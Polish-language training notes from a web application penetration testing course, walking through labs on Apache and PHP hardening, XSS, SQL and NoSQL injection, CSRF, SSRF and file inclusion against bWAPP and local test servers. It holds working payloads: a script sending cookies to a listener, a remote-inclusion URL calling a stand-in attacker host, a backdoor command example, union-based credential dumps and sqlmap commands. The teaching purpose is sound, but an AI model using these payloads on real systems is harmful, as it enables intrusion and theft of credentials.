ğŸ“… 28.01.2023 ğŸ•˜ [09:00]

WykÅ‚adowca: Kamil KamiÅ„ski

Global Web Application Penetration Testing

Chapter 1 Web Technologies & OWASP TOP 10 and Web Vulnerabilities 
= - = - = - = - = - = - =  - = - = - = - = - = - = - =- = - = - =

â„¹ï¸ Przerwy:

10.30-11.00
12.30-13.15
15.00-15.15

ğŸ”— -- DostÄ™p do Kontra:
https://tdx.application.security/

[Web Technologies]

ğŸ”— -- Generator htaccess
https://narzedzia.zenbox.pl/generator-htaccess/

### ğŸ“‹ â€“ Lab01 Apache Installation

    Uruchomienie serwera apache2

    sudo su

    service apache2 status

    service apache2 start


2. Konfiguracja serwera

    nano /etc/apache2/apache2.conf


    Nadpisywanie konfiguracji:

    Zmiana z AllowOverride None na AllowOverride All

3. Przekierowanie do pliku notfound.html

    W katalogu /var/www/html tworzymy nowy plik notfound.html


    notfound.html

    <html>

    <head><title>Strona z bledem</title></head>


    <body>

    Nie udalo sie znalezc zasobu

    </body>


    </html>


Restart serwera

    service apache2 restart


    Przekierowanie do nieistniejÄ…cej strony

    W katalogu /var/www/html tworzymy plik .htaccess i dodajemy wpis

    ErrorDocument 404 /notfound.html


    Przechodzimy w przeglÄ…darce do nieistniejÄ…cego zasobu i otrzymujemy zawartoÅ›Ä‡ strony /notfound.html


***

### ğŸ“‹ â€“ Lab02 Information Disclosure

#sprawdzamy czy wersja Apache siÄ™ pojawi:
curl -i -X OPTIONS -L http://127.0.0.1/

#ukrycie wersji Apache:
â””â”€# nano /etc/apache2/apache2.conf
#dodajemy wpisy:
ServerTokens Prod
ServerSignature off

service apache2 restart    
curl -i -X OPTIONS -L http://127.0.0.1/


â”Œâ”€â”€(rootã‰¿kali)-[/var/www/html]
â””â”€# mkdir cwiczenie01
                                                                                       
â”Œâ”€â”€(rootã‰¿kali)-[/var/www/html]
â””â”€# cd cwiczenie01  
                                                                                       
â”Œâ”€â”€(rootã‰¿kali)-[/var/www/html/cwiczenie01]
â””â”€# touch plik1 plik2 plik3
#sprawdzamy w przeglÄ…darce:
localhost/cwiczenie01


nano .htaccess
#dodajemy wpis:
Options -Indexes
#nie dziaÅ‚a juÅ¼:
localhost/cwiczenie01

â”Œâ”€â”€(rootã‰¿kali)-[/var/www/html]
â””â”€# a2dismod status
â”Œâ”€â”€(rootã‰¿kali)-[/var/www/html]
â””â”€# systemctl restart apache2 
â”Œâ”€â”€(rootã‰¿kali)-[/var/www/html]
â””â”€# nmap 127.0.0.1 --script=http-enum

ğŸ”— -- CIS Benchmark Apache HTTP Server
https://www.cisecurity.org/benchmark/apache_http_server

#aktualizacja systemu Kali Linux:
apt update && apt upgrade -y && apt dist-upgrade -y && apt autoremove

***

### ğŸ“‹ â€“ Kontra: Components with Known Vulnerabilities

***
ğŸ”— -- Notatki prowadzÄ…cego:

LAMP

Linux:
        Apache
        Mysql
        PHP


â€”â€”â€”â€”â€”â€”
Co jeÅ›li serwer chce wysÅ‚aÄ‡ wiadomoÅ›Ä‡ do klienta?
- HTTP Pooling: Czy jest nowa wiadomoÅ›Ä‡ do mnie?  Czy jest nowa wiadomoÅ›Ä‡ do mnie?  
- Long Pooling: utrzymujemy otwarte poÅ‚Ä…czenie HTTP
- WebSocket: full-duplex (poÅ‚Ä…czenie dwukierunkowe) 

â€”â€”â€”
METODA[spacja]URL[spacja]WERSJA_HTTP
GET /informacja.php?serwer=ok HTTP/1.1

â€”â€”
Walidacja inuptu pod kÄ…tem poprawnoÅ›ci danych.

Sanityzacja:
Dane przed: <script>alert(1)</script;
Dane po: script alert 1 


Backendowe jÄ™zyki: Java, C#, python, ruby, javascript (node.js), perl, java spring boot, apache tomcat, php. 

â€”â€”
PHP GET/POST
Tablice: tablica(klucz => wartoÅ›Ä‡, klucz2 => wartosc2, klucz3 => wartosc3,â€¦, â€¦.)


â€”â€”
Atak Local File Inclusion (LFI)
W kodzie wykorzystana jest funkcja include()

http://172.16.2.148/laby/vulnform.php?strony=/var/www/html/laby/plikzhaslami.txt&submit=#

include(/var/www/html/laby/plikzhaslami.txt);

Remote File Inclusion (RFI)
W kodzie wykorzystana jest funkcja include()

http://172.16.2.148/laby/vulnform.php?strony=http://serweratakujacego.pl/exploit.php&submit=#

include(http://serweratakujacego.pl/exploit.php);

Funkcja system():
Kod w PHP:      system($cmd);

http://172.16.2.148/laby/simple-backdoor.php?cmd=whoami

system(whoami);

***

### ğŸ“‹ â€“ Lab04 Secured PHP Configuration

â””â”€# cd /etc/php 
â”Œâ”€â”€(rootã‰¿kali)-[/etc/php]
â””â”€# ls
#wersja php zaleÅ¼y od posiadanej wersji
â”Œâ”€â”€(rootã‰¿kali)-[/etc/php]
â””â”€# a2enmod php8.1
â”Œâ”€â”€(rootã‰¿kali)-[/etc/php]
â””â”€# cd 8.1
â”Œâ”€â”€(rootã‰¿kali)-[/etc/php/8.1]
â””â”€# ls
â”Œâ”€â”€(rootã‰¿kali)-[/etc/php/8.1]
â””â”€# cd apache2 
â”Œâ”€â”€(rootã‰¿kali)-[/etc/php/8.1/apache2]
â””â”€# pwd
â”Œâ”€â”€(rootã‰¿kali)-[/etc/php/8.1/apache2]
â””â”€# cat php.ini| grep display_error
â”Œâ”€â”€(rootã‰¿kali)-[/etc/php/8.1/apache2]
â””â”€# cat php.ini| grep display_startup
â”Œâ”€â”€(rootã‰¿kali)-[/etc/php/8.1/apache2]
â””â”€# nano php.ini  
#wartoÅ›Ä‡ ustawiÄ‡ na 30s
max_execution_time = 30
#wartoÅ›Ä‡ ustawiÄ‡ na 128M
memory_limit = 128M
â”Œâ”€â”€(rootã‰¿kali)-[/etc/php/8.1/apache2]
â””â”€# cat php.ini| grep allow_url_include
â”Œâ”€â”€(rootã‰¿kali)-[/etc/php/8.1/apache2]
â””â”€# cat php.ini| grep allow_url_fopen  
#naleÅ¼y zmieniÄ‡ parametr allow_url_fopen na off

### ğŸ“‹ â€“ Lab05 `$_SERVER` Environment Variable

â”Œâ”€â”€(rootã‰¿kali)-[/etc/php/8.1/apache2]
â””â”€# service apache2 status
â”Œâ”€â”€(rootã‰¿kali)-[/etc/php/8.1/apache2]
â””â”€# service apache2 start 
â”Œâ”€â”€(rootã‰¿kali)-[/etc/php/8.1/apache2]
â””â”€# service apache2 status
#wersja php zaleÅ¼y od posiadanej wersji
â”Œâ”€â”€(rootã‰¿kali)-[/etc/php]
â””â”€# a2enmod php8.1
â”Œâ”€â”€(rootã‰¿kali)-[/etc/php/8.1/apache2]
â””â”€# cd /var/www/html  
â”Œâ”€â”€(rootã‰¿kali)-[/var/www/html]
â””â”€# touch OKmessage.php
â””â”€# nano OKmessage.php 

#kod php:

<html>
<head>
        <title>Lab 06</title>
</head>

<body>
To jest cwiczenie z PHP i pisania kodu.

<?php
echo "<h2>Witaj swiecie to jest kod napisany PHP</h2>"
?>

</body>
</html>

#aby zobaczyÄ‡ wynik w przeglÄ…darce wpisujemy:
http://localhost/OKmessage.php

***
#LAB PISANIE PHP - KOD DO DOKONCZENIA:

<html>
<head>
        <title>Lab 06</title>
</head>

<body>
To jest cwiczenie z PHP i pisania kodu.

<?php
        echo "<h2>Witaj swiecie to jest kod napisany PHP</h2>"
        if(isset($_GET['message'])){
        if(TU NALEZY WPISAC ZE JESLI PARAMETR GET MESSAGE = OKAY TO){
                echo 'Server Software: ' . $_SERVER['SERVER_SOFTWARE']
                echo 'DOKONCZYC KOD'
}
}
?>

</body>
</html>

***
#GOTOWY KOD LAB

<html>
<head>
        <title>Lab 06</title>
</head>

<body>
To jest cwiczenie z PHP i pisania kodu.


<?php
        echo "<h2>Witaj swiecie to jest kod napisany PHP</h2>";
        if(isset($_GET['message'])){
                if($_GET['message'] == "okay"){
                        echo 'Server Software: ' . $_SERVER['SERVER_SOFTWARE'];
                        echo 'User Agent: ' .  $_SERVER['HTTP_USER_AGENT'];

}               else {
                        echo "Warunek nie jest spelniony ";
}
}
?>

</body>
</html>

***

request.php



***
ğŸ”— -- Link do informacji o podatnoÅ›ciach PHP:
https://www.cvedetails.com/product/128/PHP-PHP.html?vendor_id=74
ğŸ”— -- kalkulator podatnoÅ›ci:
https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator


***
### ğŸ“‹ â€“ Lab06 XSS-Sterilize

xsslab.php

<html>
        <head>
                <title>XSS lab</title>
        </head>

<body>
To jest LAB z XSS</br></br>

<?php
        $imie_php = $_GET['imie'];
        $nazwisko_php = $_GET['nazwisko'];

        echo "Twoje imie to: " . $imie_php . "</br>";
        echo "Twoje nazwisko to: " . $nazwisko_php;
?>
</body>
</html>


WywoÅ‚anie XSS Reflected
http://localhost/xsslab.php?imie=adam&nazwisko=<script>alert(1)</script>

Kod po sanityzacji htmlentities

<html>
        <head>
                <title>XSS lab</title>
        </head>

<body>
To jest LAB z XSS</br></br>

<?php

        $imie_php = htmlentities($_GET['imie']);
        $nazwisko_php = htmlentities($_GET['nazwisko']);

        echo "Twoje imie to: " . $imie_php . "</br>";
        echo "Twoje nazwisko to: " . $nazwisko_php;
?>
</body>
</html>

***

xsslab2.php (wersja rozszerzona)

<html>
        <head>
                <title>XSS lab 2</title>
        </head>

<body>
To jest LAB z XSS</br></br>

<form method="get" action="<?php echo $_SERVER['PHP_SELF'];?>">
GET imie: <input type="text" name="imie">
GET nazwisko: <input type="text" name="nazwisko">
<input type="submit">
</form>

</br>

<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
POST imie: <input type="text" name="imie">
POST nazwisko: <input type="text" name="nazwisko">
<input type="submit">
</form>


<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $imie_php = htmlentities($_POST['imie']);
        $nazwisko_php = htmlentities($_POST['nazwisko']);

        echo "Wybrana metoda to POST" . "</br>";
        echo "Twoje imie to: " . $imie_php . "</br>";
        echo "Twoje nazwisko to: " . $nazwisko_php;
}

if (($_SERVER["REQUEST_METHOD"] == "GET") && isset($_GET['imie'])) {
        $imie_php = htmlentities($_GET['imie']);
        $nazwisko_php = htmlentities($_GET['nazwisko']);

        echo "Wybrana metoda to GET" . "</br>";
        echo "Twoje imie to: " . $imie_php . "</br>";
        echo "Twoje nazwisko to: " . $nazwisko_php;
}

?>
</body>
</html>


--- dummycode


Formularz, ktÃ³ry wysyÅ‚a metodÄ… GET wartoÅ›Ä‡ imie
Formularz, ktÃ³ry wysyÅ‚a metodÄ… POST wartoÅ›Ä‡ imie

JEÅšLI METODA_HTTP JEST RÃ“WNA POST:
    zmienna $imie_php = sanityzuj(wartoÅ›Ä‡ imie z POST)
    zmienna $nazwisko_php = sanityzuj(wartoÅ›Ä‡ naziwsko z POST)

    wypisz "Wybrana metoda to POST"
    wypisz "Twoje imie to " + wartoÅ›Ä‡ zmiennej $imie_php
    wypisz "Twoje nazwisko to " + wartoÅ›Ä‡ zmiennej $nazwisko_php

JEÅšLI METODA_HTTP JEST RÃ“WNA GET ORAZ WARTOÅšÄ† IMIE JEST NIEPUSTE:
    zmienna $imie_php = sanityzuj(wartoÅ›Ä‡ imie z GET)
    zmienna $nazwisko_php = sanityzuj(wartoÅ›Ä‡ naziwsko z GET)

    wypisz "Wybrana metoda to GET"
    wypisz "Twoje imie to " + wartoÅ›Ä‡ zmiennej $imie_php
    wypisz "Twoje nazwisko to " + wartoÅ›Ä‡ zmiennej $nazwisko_php

***

[OWASP TOP 10 and Web Vulnerabilities]

ğŸ”— -- OWASP Top 10 - 2021
https://owasp.org/Top10/

ğŸ”— -- OWASP ASVS Application Security Verification Standard
https://owasp.org/www-project-application-security-verification-standard/

ğŸ”— -- OWASP MASVS Mobile Application Security Verification Standard
https://mas.owasp.org/MASVS/

ğŸ”— -- OWASP Web Security Testing Guide
https://owasp.org/www-project-web-security-testing-guide/

ğŸ”— -- OWASP Cheat Sheet Series
https://cheatsheetseries.owasp.org/

ğŸ”— -- Top 10 podatnoÅ›ci w aplikacjach w 2022 roku wedÅ‚ug OWASP
https://kapitanhack.pl/2023/01/26/nieskategoryzowane/top-10-podatnosci-w-aplikacjach-w-2022-roku-wedlug-owasp/

***

### ğŸ“‹ â€“ Kontra: Leftover Debug Code

ğŸ”— -- OSINT Framework
https://osintframework.com/

ğŸ”— -- Google Hacking Database
https://www.exploit-db.com/google-hacking-database

***

### ğŸ“‹ â€“ Lab07 Vulnerability Detection

vulnform.php

<html>
        <head>
                <title>Zly formularz</title>
        </head>
<body>

<form method="get" action="#">
    <select name="strony">
        <option value="strona1.html">Strona 1</option>
        <option value="strona2.html">Strona 2</option>
    </select>
    <button type="submit" name="submit">Enter</button>
</form>

<?php
if (isset($_REQUEST['submit'])) {
    $page = $_GET['strony'];
    include($page);
}

?>

</body>
</html>


strona1.html

<html>
To jest Strona pierwsza.
</html>


strona2.html

<html>
To jest Strona druga.
</html>

***

Wykorzystanie LFI (Local File Inclusion)

http://localhost/vulnform.php?strony=/etc/passwd&submit=#

***

Detectionlist

include
eval
system
exec
include_once

Sprawdzamy wystÄ…pienia funkcji w kodzie vulnform.php
cat vulnform.php | grep -f Detectionlist

***

ğŸ“… 29.01.2023 ğŸ•˜ [15:00]

Global Web Application Penetration Testing

Chapter 2 Burp & ZAP and XSS 
= - = - = - = - = - = - =  -

[Burp & ZAP]

### ğŸ“‹ â€“ Lab01 Burp Suite Basics

ğŸ”— -- Download Burp Community 
https://portswigger.net/burp/releases/professional-community-2022-12-7

ğŸ”— -- Install Guide
https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install

Pobranie certyfikatu do konfiguracji przeglÄ…darki (Kali)

    Instalujemy FoxyProxy w przeglÄ…darce

    Dodajemy proxy dla Burp Suite - HTTP://127.0.0.1:8080

    Po wÅ‚Ä…czeniu proxy w przeglÄ…darce idziemy na stronÄ™ http://burp/

    Pobieramy certyfikat (link do szczegÃ³Å‚owej instrukcji poniÅ¼ej)

ğŸ”— -- https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox

    Ustawienia przeglÄ…darki i w MenadÅ¼erze CertyfikatÃ³w importujemy certyfikat


***

### ğŸ“‹ â€“ Lab02 bWAPP Docker

Instalacja docker

    sudo apt update

    sudo apt install -y docker.io

    docker -v

    sudo service docker start


Uruchomienie bWAPP

    docker run -d -p 9000:80 raesene/bwapp


PrzeglÄ…darka


    localhost:9000/install.php


***

Notatki prowadzÄ…cego
LAMP

Linux:
        Apache
        Mysql
        PHP


â€”â€”â€”â€”â€”â€”
Co jeÅ›li serwer chce wysÅ‚aÄ‡ wiadomoÅ›Ä‡ do klienta?
- HTTP Pooling: Czy jest nowa wiadomoÅ›Ä‡ do mnie?  Czy jest nowa wiadomoÅ›Ä‡ do mnie?  
- Long Pooling: utrzymujemy otwarte poÅ‚Ä…czenie HTTP
- WebSocket: full-duplex (poÅ‚Ä…czenie dwukierunkowe) 

â€”â€”â€”
METODA[spacja]URL[spacja]WERSJA_HTTP
GET /informacja.php?serwer=ok HTTP/1.1

â€”â€”
Walidacja inuptu pod kÄ…tem poprawnoÅ›ci danych.

Sanityzacja:
Dane przed: <script>alert(1)</script;
Dane po: script alert 1 


Backendowe jÄ™zyki: Java, C#, python, ruby, javascript (node.js), perl, java spring boot, apache tomcat, php. 

â€”â€”
PHP GET/POST
Tablice: tablica(klucz => wartoÅ›Ä‡, klucz2 => wartosc2, klucz3 => wartosc3,â€¦, â€¦.)

If $_GET[message] =  okay 
        echo coÅ› tam coÅ› tam

â€”â€”
Atak Local File Inclusion (LFI)
W kodzie wykorzystana jest funkcja include()

http://172.16.2.148/laby/vulnform.php?strony=/var/www/html/laby/plikzhaslami.txt&submit=#

include(/var/www/html/laby/plikzhaslami.txt);

Remote File Inclusion (RFI)
W kodzie wykorzystana jest funkcja include()

http://172.16.2.148/laby/vulnform.php?strony=http://serweratakujacego.pl/exploit.php&submit=#

include(http://serweratakujacego.pl/exploit.php);

Funkcja system():
Kod w PHP:      system($cmd);

http://172.16.2.148/laby/simple-backdoor.php?cmd=whoami

system(whoami);

***

ğŸ“… 04.02.2023 ğŸ•˜ [09:00]

# Ponowne zainstalowanie bwapp

    docker image ls

    docker image rm <IMAGE ID>

    docker run -d -p 9000:80 raesene/bwapp


localhost:9000/install.php

***

### ğŸ“‹ â€“ Kontra: User Enumeration

***

### ğŸ“‹ â€“ TDX Arena: EnumUsers

***

### ğŸ“‹ â€“ Lab03 Burp Suite Repeater

ğŸ”‘ â€“ bee:bug
Security Level: low

***

### ğŸ“‹ â€“ Lab04 Burp Suite Intruder

***

### ğŸ“‹ â€“ Lab05 Intruder Follow Redirection

ğŸ”— -- strona do testÃ³w:
https://hack-yourself-first.com/

***

### ğŸ“‹ â€“ Lab06 Brute Force Websiteâ€™s Paths

Burp Intruder

/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

---

[XSS]

ğŸ”— -- przykÅ‚adowe wykonanie skryptu:
https://suvroc.github.io/security-demos/XSS/reflectedXSS.html?name=<script>alert(1)</script>
https://suvroc.github.io/security-demos/XSS/storedXSS.html

### ğŸ“‹ â€“ Lab08 Reflected XSS 

W BWAPP proszÄ™ wybraÄ‡: XSS-Reflected(GET)

wpisujemy w pasku URL:
http://172.16.2.148:9000/xss_get.php?firstname=%3Cscript%3Ealert(document.cookie)%3C/script%3E&lastname=adamski&form=submit

<script>alert(document.cookie)</script>


### ğŸ“‹ â€“ Lab09 Stored XSS 

W BWAPP proszÄ™ wybraÄ‡: Cross-Site Scripting - Stored (Blog)/ XSS-Stored(Blog)
<script>alert("Czy jestpodatny")</script>

### ğŸ“‹ â€“ Lab10 Cookie Hijacking

NaleÅ¼y uruchomiÄ‡:
nc -lvp 4444

W BWAPP proszÄ™ wybraÄ‡: XSS - Reflected(GET)

<script>new Image().src='http://172.16.2.148:4444/?cookie='+document.cookie; </script>

***

ğŸ“… 05.02.2023 ğŸ•˜ [09:00]

ğŸ”— -- przykÅ‚adowy cheatsheet z instrukcjÄ… jak ominÄ…Ä‡ filtry:
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

ğŸ  Homework. PrzerobiÄ‡ laby z bWAPP:
XSS - Stored (Blog)
XSS - Reflected (GET)\
XSS - Reflected (Post)

i zadania z Kontra.

***

Chapter 3: Database Management & SQL Injection
= - = - = - = - = - = - = - = - = - = - = - = -

[Database Management]

ğŸ”— -- komendy Docker
https://frontstack.pl/docker-komendy/
https://bykowski.pl/docker-lista-komand-twoja-podreczna-sciaga/

ğŸ”— -- kolumny i tabele w bazie danych
https://cdn.tutsplus.com/net/authors/lalith-polepeddi/relational-databases-for-dummies-fig1.png

***

### ğŸ“‹ â€“ Lab01 Building an SQL Database

#Tworzenie nowego kontenera:
docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql

docker run --name mysql_lab -p 3306:3306  -e MYSQL_ROOT_PASSWORD=sqlhaslo -d mysql

mysql --protocol=tcp -u root -p

#listuje bazy danych:
show databases;

#Tworzenie bazy danych
create database cyber;

#Wejscie do bazy danych
use cyber;

#Tworzenie tabeli:
CREATE TABLE whitehacker(id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY, username VARCHAR(30) NOT NULL, password VARCHAR(20) NOT NULL, country VARCHAR(20) NOT NULL, role VARCHAR(20) NOT NUL);

#Usuwanie tabeki:
drop table whitehacker;

#wyÅ›wietlanie tabeli:
show tables;

#Tworzenie tabeli blackhacker:
create table blackhacker(id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY, username VARCHAR(30) NOT NULL, password VARCHAR(20) NOT NULL, country VARCHAR(20) NOT NULL, role VARCHAR(20) NOT NULL);

#wyÅ›wietla zawartoÅ›Ä‡ tabeli:
describe whitehacker;

#UzupeÅ‚nianie tabeli whitehacker:
INSERT INTO whitehacker (username,password,country,role) values
-> ("Adam","12345","PL","Admin"),
-> ("Tomek","haslo12","PL","Ksiegowy"),
-> ("TOM","password","UK","Pentester"),
-> ("Kasia","kasiakasia","PL","Dyrektor Finansowy"),
-> ("Zosia","qwertyhhshjhs","USA","Stazysta");

#WyÅ›wietla wybrane dane (* - wszystkie dane) z tabeli:
select * from whitehacker;

#UzupeÅ‚nianie tabeli blackhacker:
INSERT INTO blackhacker (username, password, country, role) VALUES 
    -> ("Tadeusz", "kot", "PL", "Naczlnym Hax0r3m"), 
    -> ("Anonimowy Hax0r", "adaslkm233klmdkm23", "TAJNE", "Secret Stanowisko"),
    -> ("Malgorzata", "gosia12", "JPN", "Menedzer"), 
    -> ("Tomasz", "tomasztomasz", "PL", "Junior"),
    -> ("Marzena", "12345", "CZ", "Programistka");


SELECT * FROM blackhacker;

SELECT username, password FROM blackhacker;

SELECT username, password FROM blackhacker WHERE id=1;

#Sortowanie po id (domyÅ›lnie rosnÄ…co)
select * from whitehacker order by id;

#Sortowanie po id, malejÄ…co (desc)
select * from whitehacker order by id desc;

#Sortowanie po id, ograniczone do 2 wpisÃ³w:
select * from whitehacker order by id LIMIT 2;

#Sortowanie po id, filtrowanie o wybranej kolumnie (2 - password):
select * from whitehacker order by 2;

#ÅÄ…czenie zapytaÅ„:
SELECT * FROM whitehacker UNION SELECT * FROM blackhacker;

SELECT username, password FROM blackhacker UNION SELECT country, role FROM whitehacker; 

#dokleja/ dopisuje 1, 2 zamiast wyÅ›wietlenia kolumny w  drugiej tabeli
SELECT username, password FROM blackhacker UNION SELECT 1,2; 
SELECT username, password FROM blackhacker UNION SELECT "hakujemy", "jakies tam sÅ‚owo";

#doklei odpowiednio: wersjÄ™ MySQL, nazwÄ™ bazy, zalogowanego usera:
SELECT username, password FROM blackhacker UNION SELECT version(), "jakies tam sÅ‚owo";

SELECT username, password FROM blackhacker UNION SELECT version(), database();

SELECT username, password FROM blackhacker UNION SELECT version(),user();

***

### ğŸ“‹ â€“ Lab02 Displaying Specific Data

1. SELECT * FROM whitehacker;
2. SELECT * FROM blackhacker;
3. SELECT table_name FROM information_schema.tables;
4. Informacje o sesji:

    use information_schema;

    show session status;


***

### ğŸ“‹ â€“ Lab03 SELECT Queries

1. SELECT * FROM blackhacker WHERE country="PL";
2. SELECT * FROM blackhacker WHERE country="GER";
3. SQL injection

    SELECT * FROM blackhacker WHERE country="GER" OR 1=1;

4. SELECT * FROM blackhacker ORDER BY role;
5. SELECT username, password, country, role FROM blackhacker UNION ALL SELECT username, password, country, role FROM whitehacker;
6. Export pliku

    SELECT username, password, country, role FROM blackhacker UNION ALL SELECT username, password, country, role FROM whitehacker INTO OUTFILE '/var/lib/mysql-files/eksport.txt';


WejÅ›cie do dockera z mysql:
    docker exec -it mysql_lab /bin/bash

***

[SQL Injection]

### ğŸ“‹ â€“ Kontra: SQL Injection

***

bWapp > / SQL Injection (GET/Search) /

Search for a movie: man' or 1=1#

***

### ğŸ“‹ â€“ Lab05 Boolean-Based

bWapp > / SQL Injection (Login Form/Hero) /

Login: login' OR 1=1 -- -
Password: dowolne

***

### ğŸ“‹ â€“ Lab06 Union-Based

bWapp > / SQL Injection (GET/Search) /

Search for a movie:

    ' order by 7 -- -

    1' UNION SELECT 1,2,3,4,5,6,7 -- -

    1' UNION SELECT 1,version(),3,4,5,6,7 -- -

    1' UNION SELECT 1,database(),3,4,5,6,7 -- -

    1' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()-- -

    1' UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='users'-- -

    1' UNION SELECT 1, concat(login, " ", password),3,4,5,6,7 FROM users-- -


***

ğŸ“… 05.02.2023 ğŸ•˜ [16:00]

Global Web Application Penetration Testing

Chapter 4: Advanced SQLi & NoSQL Injection 
= - = - = - = - = - = - =  - = - = - = - = 

[Advanced SQLi]

### ğŸ“‹ â€“ Lab01 Enumeration with Intruder

bWapp > / SQL Injection - Blind - Time-Based /

Search for a movie:

    aa' OR sleep(0.5) -- -

    iron man' AND substring(database(),1,1)="b" and sleep(0.5) -- -

    Send to Intruder

    zaznaczamy cyfrÄ™ od ktÃ³rej startujemy Â§1Â§ oraz literÄ™ Â§bÂ§ > Cluster Bomb

    GET /sqli_15.php?title=iron+man%27+AND+substring%28database%28%29%2CÂ§1Â§%2C1%29%3D%22Â§bÂ§%22+AND+sleep%280.5%29+--+-&action=search HTTP/1.1

    Payload 1: Wybieramy listÄ™ Numbers > 1 - 6

    Payload 2: Tworzymy sÅ‚ownik liter od a - z

    Start Attack

    Na liÅ›cie wynikÃ³w dodajemy kolumnÄ™ Response recevied

    Wyniki:

    1 - b

    2 - w

    3 - a

    4 - p

    5 - p


***

### ğŸ“‹ â€“ Lab02 SQLMap

bWapp > / SQL Injection (GET/Search) /

Przechwytujemy GET z Burp i edytujemy

sqli.req
GET /sqli_1.php?title=*&action=search HTTP/1.1

Terminal:

    sqlmap -r sqli.req

    sqlmap -r sqli.req --dbs --tables

    sqlmap -r sqli.req -D bwapp -T users --dump


***

ğŸ“… 11.02.2023 ğŸ•˜ [09:00]

Zaawamsowane zapytanie do bazy danych:

    SELECT Username, Role FROM blackhacker ORDER BY (case when (SELECT substring(Username,1,1) FROM blackhacker WHERE id=1) );


    SELECT Username, Role FROM blackhacker ORDER BY (case when (SELECT substring(Username,1,1) FROM blackhacker WHERE id=1)='J' then Username else Department end);


***

ğŸ”— -- Tabela ASCII
https://www.asciitable.com/

***

### ğŸ“‹ â€“ Lab03 Enumerating a Website

# dirb

dirb http://localhost:9000/ /usr/share/wordlists/dirb/big.txt -X .php


# gobuster

sudo apt update
sudo apt install gobuster

gobuster dir -u http://localhost:9000/ -w /usr/share/wordlists/dirb/big.txt -x php

***

Zapytanie do bazy z wykorzystaniem concat:
    
SELECT CONCAT((SELECT database()), "-----", "test lab" );

***

[NoSQL Injection]

### ğŸ“‹ â€“ Lab04 MongoDB Installation

Instalacja MongoDB

sudo su
wget -qO - https://www.mongodb.org/static/pgp/server-5.0.asc | sudo apt-key add -
echo "deb http://repo.mongodb.org/apt/debian buster/mongodb-org/5.0 main" | sudo tee /etc/apt/sources.list.d/mongodb-org-5.0.list   

apt update
apt install mongodb-org
service mongod start
service mongod status
mongo

II opcja

wget -qO - https://www.mongodb.org/static/pgp/server-6.0.asc | sudo apt-key add -
echo "deb http://repo.mongodb.org/apt/debian buster/mongodb-org/6.0 main" | sudo tee /etc/apt/sources.list.d/mongodb-org-6.0.list
apt update
apt-get install -y mongodb-org
service mongod start
service mongod status
mongo
# Do you want to install it? (N/y)y
apt install mongodb-clients
mongo

***

### ğŸ“‹ â€“ Lab05 Database Management

4. db.uzytkownicy.insertMany([{name:"Leo"},{name:"Donie"},{name:"Mikey"},{name:"Raplh"},{name:"Splinter"}])

5. db.uzytkownicy.find()

6. db.uzytkownicy.find({name: "Mikey"})

***

### ğŸ“‹ â€“ Lab06 NoSQL Injection

ğŸ”— -- NoSQL MongoDB
https://ln4.sync.com/dl/03be902f0/xevarw9g-mgudu57e-b2wu9h5f-fkhc27qp/

MongoDB Server.ova - 10.3 GB

ğŸ”‘ -- root:toor

service apache2 start
service mongod start

John:[$exists]

7. http://localhost/data.php?username[$exists]&password[$exists]
8. http://localhost/data.php?username[$regex]=^Z&password[$exists]

***

### ğŸ“‹ â€“ Lab07 Securing MongoDB

use admin
db.createUser({user: "root", pwd: "toor", roles:[{role: "userAdminAnyDatabase", db:"admin"}, "readWriteAnyDatabase"]})

# Zmiany w pliku /etc/mongod.conf

#security
setParameter:
    enableLocalhostAuthBypass: false
security:
    authorization: enabled

service mongod restart

mongo -u "root" -p

***

ğŸ“… 11.02.2023 ğŸ•˜ [12:20]

Global Web Application Penetration Testing

Chapter 5: Identification and Authentication Failures & CSRF and XXE & SSRF 
= - = - = - = - = - = - =  - = - = - = - = - = - = - = - = - = - = - = = - 

[Identification and Authentication Failures & CSRF]

### ğŸ“‹ â€“ Kontra: Token Exposure in URL

### ğŸ“‹ â€“ Kontra: Cross Site Request Forgery

***

### ğŸ“‹ â€“ Lab01 CSRF via GET

docker start ID_bWAPP
lub 
docker run -d -p 9000:80 raesene/bwapp
IP:9000/install.php

### ğŸ“‹ â€“ Lab02 CSRF via POST

https://owasp.org/www-project-secure-headers/
bWAPP CSRF (Change Secret)

cd /var/www/html
nano csrf.html

#wkleic kod i podmieniÄ‡ adres IP:
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://172.16.2.148:9001/csrf_3.php" method="POST">
      <input type="hidden" name="secret" value="nowytajny" />
      <input type="hidden" name="login" value="alicja" />
      <input type="hidden" name="action" value="change" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

service apache2 start

### ğŸ“‹ â€“ Lab03 Password Attack

### ğŸ“‹ â€“ Lab04 SSRF Attack


[XXE & SSRF]

#inne zapisy dla 127.0.0.1
0177.0.0.1
0177.0Ã—01.0.1
0x7f.0.0.0Ã—01
127.1

ğŸ”— -- Instance metadata and user data
https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html

***

ğŸ“… 12.02.2023 ğŸ•˜ [9:00]

Global Web Application Penetration Testing

Chapter 6 LFI/RFI to RCE & WordPress Hacking and Reporting & Vulnerabilities

= - = - = - = - = - = - =  - = - = - = - = - = - = - = - = - = - = - = = - 

[ LFI/RFI to RCE & WordPress Hacking]

### ğŸ“‹ â€“ Lab01 Local File Inclusion

w bWAPP naleÅ¼y wybraÄ‡ Remote &Local File Inclusion (RFI/LFI)
naleÅ¼y wybraÄ‡ jÄ™zyk
w url naleÅ¼y podmieniÄ‡ =/etc/passwd zamiast jÄ™zyka 

### ğŸ“‹ â€“ Lab02 Abusing File Streams

w bWAPP naleÅ¼y wybraÄ‡ Remote &Local File Inclusion (RFI/LFI)
naleÅ¼y wybraÄ‡ jÄ™zyk
